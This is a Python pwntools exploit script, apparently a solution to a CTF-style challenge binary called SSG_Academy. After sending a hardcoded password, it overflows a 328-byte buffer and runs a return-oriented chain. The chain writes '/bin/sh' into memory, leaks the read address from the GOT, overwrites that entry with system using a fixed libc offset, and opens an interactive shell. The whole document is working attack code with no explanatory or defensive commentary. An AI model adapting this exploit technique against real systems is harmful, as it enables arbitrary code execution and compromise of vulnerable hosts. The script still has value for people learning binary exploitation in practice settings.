from pwn import *
import time

p = process("./SSG_Academy")
e = ELF("./SSG_Academy")


read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
bss = e.bss()
#bss = 0x602070 

pppr = 0x4007ea
pr = 0x4007ee
offset = 0xb3190

payload = 'A'*328

#1 write bss secsion "/bin/sh"
payload += p64(pppr)
payload += p64(0)
payload += p64(bss)
payload += p64(8)
payload += p64(read_plt)

#2 get read_got 
payload += p64(pppr)
payload += p64(1)
payload += p64(read_got)
payload += p64(8)
payload += p64(write_plt)

#3 change read_got into system
payload += p64(pppr)
payload += p64(0)
payload += p64(read_got)
payload += p64(8)
payload += p64(read_plt)

#4 call read, actually system
payload += p64(pr)
payload += p64(bss)
payload += p64(read_plt)

p.recvuntil(">>")
p.sendline("19950610")

p.recvuntil(">>")
p.send(payload)

p.sendline("/bin/sh")
time.sleep(1)

p.recvuntil("+++++++++\n\n")

read_addr = u64(p.recv(8))
system_addr = read_addr - offset

p.send(p64(system_addr))

p.interactive()
